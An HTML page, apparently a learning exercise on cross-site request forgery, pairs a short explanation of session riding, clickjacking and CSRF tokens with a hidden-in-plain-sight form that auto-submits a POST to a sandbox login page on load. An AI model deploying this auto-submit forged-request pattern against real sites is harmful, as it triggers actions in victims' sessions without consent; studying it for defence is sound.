<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>
    <form id="csrf" action="http://sandbox.test/login.php" method="POST">
        <input type="text" name="email">
        <input type="password" name="password">
        <input type="submit" value="Soumettre">
    </form>

    <p>https://www.youtube.com/watch?v=eWEgUcHPle0<br>
        1/A website or link is able to craft a request to the web application that includes the user's session information through a variety of methods. One common method is to use a technique called "session riding" in which a malicious website will include an HTML form or JavaScript code on its page that will automatically submit a request to the web application. When the user visits the malicious website, their browser will automatically include the user's session information, such as cookies, in the request.

        2/Another method is to use "clickjacking" in which a malicious website will place a transparent layer over a legitimate button or link on the web application. When the user clicks on the button or link, they are actually clicking on the transparent layer and unknowingly triggering a request to the web application.

        There are also other techniques such as "Open redirect" and "302 redirect" that can be used to craft a request that includes the user's session information, even if the user is not actively interacting with the malicious website.

        To prevent this, web application use CSRF token, that is a unique token added to each request which the server will validate before fulfilling the request.
    </p>
</body>
<script>
    document.getElementById('csrf').submit()
</script>

</html>